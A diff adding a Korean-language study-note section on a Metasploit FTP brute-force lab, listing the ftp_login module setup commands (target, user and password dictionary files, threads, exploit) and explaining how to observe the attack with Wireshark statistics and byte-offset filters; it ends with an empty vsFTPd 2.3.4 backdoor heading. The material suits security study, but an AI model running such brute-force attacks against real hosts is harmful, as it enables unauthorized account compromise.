@@ -116,3 +116,60 @@ msf > exploit
 
 ## FTP 무작위 대입 공격 및 와이어샤크 패킷 확인
 
+```
+msf > search ftp_login
+```
+-ftp_login과 관련된 항목 검색
+
+Kali에는 사전 파일이 존재하기 때문에 ID, PASSWD과 관련된 항목 Brute Force 가능.
+
+```
+msf > use 0
+```
+-ftp_login과 관련된 항목은 1개. 즉 use 0
+
+```
+msf > set RHOSTS [ip]
+```
+-대상 IP로 RHOSTS 설정
+
+```
+msf > set USER_FILE [dir]
+```
+-사전 파일 위치 등록(user)
+
+```
+msf > set PASS_FILE [dir]
+```
+-사전 파일 위치 등록(password)
+
+```
+msf > set THREADS 5
+```
+-스레드 개수는 5개 정도가 적절
+
+```
+msf > exploit
+```
+-공격 진행
+
+### Wireshark Statistics
+
+- Statistics - Conversations: Wireshark에서 제공하는 기능 중 하나로, 두 호스트, 두 포트, 또는 두 프로토콜 간의 통신 대화(conversation)를 분석할 때 사용한다.
+- Statistics - Endpoints: Wireshark에서 제공하는 기능 중 하나로, 개별 호스트(Endpoint)의 트래픽 통계를 보여준다.
+
+msfconsole을 이용해서 FTP BruteForce 공격을 진행하게 될 시, Wireshark Statistics 기능을 이용해서 조회 가능
+
+```
+frame[offset:length] == value
+```
+Wireshark에서는 패킷 내 특정 위치의 바이트를 직접 비교할 수 있다.
+
+이를 통해 "login successful"이 진행된 위치의 오프셋을 직접 조회할 수도 있음.
+
+---
+
+## vsFTP 2.3.4 발견된 백도어 공격
+
+
+
